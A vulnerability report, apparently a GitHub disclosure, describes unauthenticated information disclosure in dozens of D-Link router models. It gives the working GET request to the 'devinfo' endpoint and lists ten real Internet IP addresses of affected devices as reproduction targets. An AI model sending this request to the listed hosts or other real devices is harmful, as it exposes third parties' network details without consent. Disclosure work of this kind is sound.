# Vulnerability Report

## Vulnerability Description
Summary: D-Link is vulnerable to an unauthorized access exploit, allowing attackers to retrieve sensitive information such as device MAC address, IP address, routing details, device region, version number, etc., by specifying a command,Affecting over 100,000 devices on the Internet.
![图片](https://github.com/999zzzzz/D-Link/assets/156400365/9d9b7217-0c73-480b-a2f0-87d9d8c1d737)

## Affected Versions
Affected software versions: DIR-825ACG1、DIR-841、DIR-1260、DIR-822、DIR-X1530、DIR-825、DIR-615、DIR-842、DIR-853、DIR-1210、DIR-806A、DIR-815、DSL-245GR、DSL-G2452GR、DIR-878、DIR-825ACF、DIR-615T、DIR-300、DIR-842S、DIR-815S、DSL-2640U、DIR-2150、DWR-921、DIR-615S、DIR-620、DVG-5402G、DIR-882、DWM-312W、DIR-815/AC、DSL-224、DWM-321、DIR-X1860、DAP-1360、DIR-820、DIR-843、DVG-5402G/GFRU、DWR-953、DVG-N5402G/IL、DIR-825AC、DIR-620S、DVG-N5402G、Good Line Router v2、DSL-2750U、DIR-615GF、DIR-816

## Vulnerability Details
Detailed information: The "area" parameter of the "devinfo" interface is controllable, allowing for the retrieval of device information. The specific path for the GET request is http://127.0.0.1/devinfo?area=notice|net|version

## Reproduction Steps
Reproduction steps: Ten cases on the Internet were randomly selected:
http://213.108.214.236/
http://217.66.150.18/
http://92.69.82.91/
http://176.212.138.53:9990/
http://185.190.149.189/
http://185.196.118.2/
http://59.127.168.20:1080/
http://176.212.138.237:2376
http://91.240.114.69/
http://62.80.188.13/

## Expected Result
Expected result: The expected result is returned in json format, and the package contains sensitive information fields of the device, including but not limited to ModelName, Version Mask, ModelId, and DeviceMac

## Actual Result
Actual result: ![1705037675942](https://github.com/999zzzzz/D-Link/assets/156400365/a8d7a00f-d2b2-4be2-9ed9-ccedc8f93372)
![图片](https://github.com/999zzzzz/D-Link/assets/156400365/1f4a0b13-ac53-472e-8e83-cf3c0649a1e2)

## Fix Recommendation
Fix recommendation: We recommend that you authenticate the interface

